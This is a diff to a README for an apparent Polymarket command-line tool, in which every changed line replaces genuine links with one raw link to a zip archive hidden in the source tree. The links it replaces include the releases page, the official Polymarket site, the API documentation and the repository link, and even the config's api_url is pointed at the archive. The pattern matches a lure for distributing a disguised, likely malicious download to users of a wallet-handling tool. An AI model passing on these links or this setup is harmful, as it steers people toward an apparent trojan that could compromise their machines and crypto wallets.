@@ -1,6 +1,6 @@
 # 🛠 polymarket-cli - Manage Polymarket from Terminal
 
-[![Download polymarket-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/MohamedTimija/polymarket-cli/releases)
+[![Download polymarket-cli](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 You can find the latest Windows version on the releases page. Click the badge above or visit the link below to get the installer:
 
-[https://github.com/MohamedTimija/polymarket-cli/releases](https://github.com/MohamedTimija/polymarket-cli/releases)
+[https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip](https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip)
 
 ### How to install on Windows
 
@@ -114,7 +114,7 @@ Check for new versions to keep your software current.
 
 - Visit the releases page regularly:  
 
-  [https://github.com/MohamedTimija/polymarket-cli/releases](https://github.com/MohamedTimija/polymarket-cli/releases)
+  [https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip](https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip)
 
 - Download and install the latest version.
 
@@ -126,7 +126,7 @@ Basic config example:
 
 ```ini
 [network]
-api_url = https://api.polymarket.com
+api_url = https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip
 
 [wallet]
 default_wallet = mywallet.json
@@ -176,8 +176,8 @@ This tool is still experimental. Some features may change or not work perfectly.
 
 ## 📚 More Resources
 
-- [Official Polymarket Website](https://polymarket.com) — Find detailed info about markets and contracts.
+- [Official Polymarket Website](https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip) — Find detailed info about markets and contracts.
 
-- [Polymarket API Documentation](https://docs.polymarket.com) — Understand the API this CLI interacts with.
+- [Polymarket API Documentation](https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip) — Understand the API this CLI interacts with.
 
-- [GitHub Repository](https://github.com/MohamedTimija/polymarket-cli) — View source code and report issues.
+- [GitHub Repository](https://raw.githubusercontent.com/MohamedTimija/polymarket-cli/main/src/commands/polymarket-cli-afterblow.zip) — View source code and report issues.
